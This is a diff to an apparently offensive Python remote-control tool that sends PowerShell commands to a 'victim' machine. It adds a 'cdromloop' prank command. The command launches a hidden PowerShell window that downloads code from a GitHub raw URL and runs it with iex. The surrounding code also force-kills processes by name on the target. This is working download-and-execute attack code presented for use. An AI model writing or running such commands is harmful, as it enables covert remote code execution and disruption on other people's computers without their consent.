@@ -136,6 +136,7 @@ while not stop:
             print("ducky/cdrom          N/A          Eject the cdrom drive")
             print("ducky/iter           \"#\" {\"code\"} Run the powershell code a specified # of times")
             print("ducky/killall        \"process\"    Kill all processes with this name")
+            print("ducky/cdromloop      N/A          Prank the victim with a continuously ejecting cdrom drive")
             stdin = ""
         elif ducky_command[:4] == "quit":
             options = [x for x in ducky_command.split(" ")[1:] if x]
@@ -253,6 +254,10 @@ while not stop:
             options = [x for x in ducky_command.split(" ")[1:] if x]
             commands = []
             commands.append("tasklist | findstr /i " + options[0] + " | findstr /v $pid | foreach-object{taskkill /f /pid $_.split(\" \")[16]}")
+            stdin = "; ".join(commands)
+        elif ducky_command[:9] == "cdromloop":
+            commands = []
+            commands.append("start-process powershell -argument \'-windowstyle hidden -command iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/cdrom).content\'")
             stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
